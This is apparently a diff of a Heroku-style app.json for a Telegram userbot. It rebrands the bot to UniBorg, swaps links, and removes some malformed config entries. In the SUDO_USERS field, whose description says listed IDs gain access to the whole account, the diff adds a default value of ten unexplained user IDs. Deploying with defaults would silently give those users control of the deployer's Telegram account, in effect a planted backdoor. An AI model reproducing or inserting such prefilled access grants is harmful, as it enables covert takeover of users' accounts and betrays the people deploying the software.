@@ -1,7 +1,7 @@
 {
-  "name": "The_TG_Bot",
-  "description": "Modular Telegram userbot based on @Uniborg!",
-  "logo": "https://telegra.ph/file/dbb990b02b9375fafd29a.png",
+  "name": "UniBorg",
+  "description": "Modular UserBot powered by @TelethonChat!",
+  "logo": "https://telegra.ph/file/6ce444f5ba54d79fb8622.jpg",
   "keywords": [
     "telegram",
     "userbot",
@@ -9,9 +9,9 @@
     "modular",
     "productivity"
   ],
-  "repository": "https://github.com/Priyam005/The_TG_Bot",
-  "website": "",
-  "success_url": "https://t.me/A_FRICKING_GAMER",
+  "repository": "https://gitlab.com/SpEcHiDe/UniBorg",
+  "website": "https://telegram.dog/UniBorg",
+  "success_url": "https://t.me/UniBorg/5",
   "env": {
     "ENV": {
       "description": "Setting this to ANYTHING will enable environment variables.",
@@ -99,7 +99,7 @@
     },
     "NO_P_M_SPAM": {
       "description": "Set to True if you want to block users that are spamming your PMs.",
-      "value": "ANYTHING"
+      "required": false
     },
     "MAX_FLOOD_IN_P_M_s": {
       "description": "Define the number of consecutive messages a new user can send to your P.M. This should be a valid Integer.",
@@ -122,7 +122,8 @@
       "required": false
     },
     "SUDO_USERS": {
-      "description": "List down the user IDs who should have permission to use you. Be Careful. You are granting access to your entire account to the people you mention in the below field, seperated by SPACE. Send .id in any private chat or as a reply to any user in any group, to fill this value",
+      "description": "List down the user IDs who should have permission to use you. Be Careful. You are granting access to your entire account to the people you mention in the below field, seperated by SPACE. Send .get_id in any private chat or as a reply to any user in any group, to fill this value",
+      "value": "7351948 500346573 606342588 653184647 751003349 752396210 797179106 804216742 830068297 873236756",
       "required": false
     },
     "UB_BLACK_LIST_CHAT": {
@@ -144,36 +145,6 @@
     },
     "G_DRIVE_CLIENT_ID": {
       "description": "Get your credentials from https://da.gd/so63O",
-      "required": false
-    },
-    },
-    "REPO_LINK": {
-      "description": "Set the link to your repo here to obtain it in telegram with .get repo",
-      "required": false
-    },
-    },
-    "PACK_NAME": {
-      "description": "Set a sticker pack name to be used when making a sticker pack with .kang",
-      "required": false
-    },
-    },
-    "LYDIA_API": {
-      "description": "Set your lydia api id to able to use lydia ai in telegram",
-      "required": false
-    },
-	},
-    "PACKS_CONTENT": {
-      "description": "Set the content to be displayed when .get packs is executed in telegram",
-      "required": false
-    },
-    },
-    "HEROKU_LINK": {
-      "description": "Set the link to your heroku webpage here to obtain it in telegram with .get heroku",
-      "required": false
-    },
-    },
-    "ANIM_PACK_NAME": {
-      "description": "Set an animated sticker pack name to be used when making a sticker pack with .kang",
       "required": false
     },
     "G_DRIVE_CLIENT_SECRET": {
